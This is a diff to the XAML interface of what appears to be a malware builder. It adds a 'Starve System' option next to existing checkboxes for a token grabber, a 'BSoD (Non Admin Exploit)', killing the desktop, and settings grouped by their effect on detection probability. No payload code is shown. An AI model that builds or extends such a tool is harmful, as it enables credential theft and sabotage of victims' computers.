@@ -250,7 +250,7 @@
             </Border>
 
             <icons:PackIconFontAwesome x:Name="LoudIcon" Grid.ColumnSpan="1" Opacity="0.45" Grid.Column="0" Foreground="White" Width="50" Height="50" HorizontalAlignment="left" Kind="VolumeDownSolid" RotationAngle="15" Margin="26,26,0,0"/>
-            <TextBlock x:Name="LoudDescription" Grid.Column="1" Grid.Row="1" Grid.ColumnSpan="2" TextWrapping="WrapWithOverflow" HorizontalAlignment="left" TextAlignment="Center" VerticalAlignment="Top" FontFamily="Cascadia Mono Light" Padding="15 5 15 15" Foreground="#0CFFFFFF">The features in this section have a moderate effect on detection probability</TextBlock>
+            <TextBlock x:Name="LoudDescription" Grid.Column="1" Grid.Row="1" Grid.ColumnSpan="2" TextWrapping="WrapWithOverflow" HorizontalAlignment="left" TextAlignment="Center" VerticalAlignment="Top" FontFamily="Cascadia Mono Light" Padding="15 10 15 15" Foreground="#0CFFFFFF">The features in this section have a moderate effect on detection probability</TextBlock>
 
             <Button x:Name="TokenGrabberCheckBox" Grid.RowSpan="2" Grid.Column="1" Width="20" Height="20" Padding="0" Foreground="#7FFFFFFF" Background="{x:Null}" BorderBrush="{x:Null}" HorizontalAlignment="Left" VerticalAlignment="Top" Margin="9,13,0,0" >
                 <materialDesign:PackIcon Width="18" Height="18" Kind="CheckboxBlankOutline"/>
@@ -266,6 +266,11 @@
                 <materialDesign:PackIcon Width="18" Height="18" Kind="CheckboxBlankOutline" HorizontalAlignment="Center"/>
             </Button>
             <Label Margin="28,58,0,0" Grid.RowSpan="2" Grid.Column="1" Foreground="#CCFFFFFF" Content="BSoD (Non Admin Exploit)"/>
+
+            <Button x:Name="StarveSysCheckBox" Grid.Column="1" Grid.RowSpan="2" Width="20" Height="20" Padding="0" Foreground="#7FFFFFFF" Background="{x:Null}" BorderBrush="{x:Null}" HorizontalAlignment="Left" VerticalAlignment="Top" Margin="9,85,0,0" >
+                <materialDesign:PackIcon Width="18" Height="18" Kind="CheckboxBlankOutline"/>
+            </Button>
+            <Label Foreground="#CCFFFFFF" Grid.Column="1" Grid.RowSpan="2" Margin="28,82,0,0" Content="Starve System"/>
 
             <Button x:Name="KillDesktopCheckBox" Grid.RowSpan="2" Grid.Column="0" Width="20" Height="20" Padding="0" Foreground="#7FFFFFFF" Background="{x:Null}" BorderBrush="{x:Null}" HorizontalAlignment="Left" VerticalAlignment="Top" Margin="9,109,0,0" >
                 <materialDesign:PackIcon Width="18" Height="18" Kind="CheckboxBlankOutline"/>
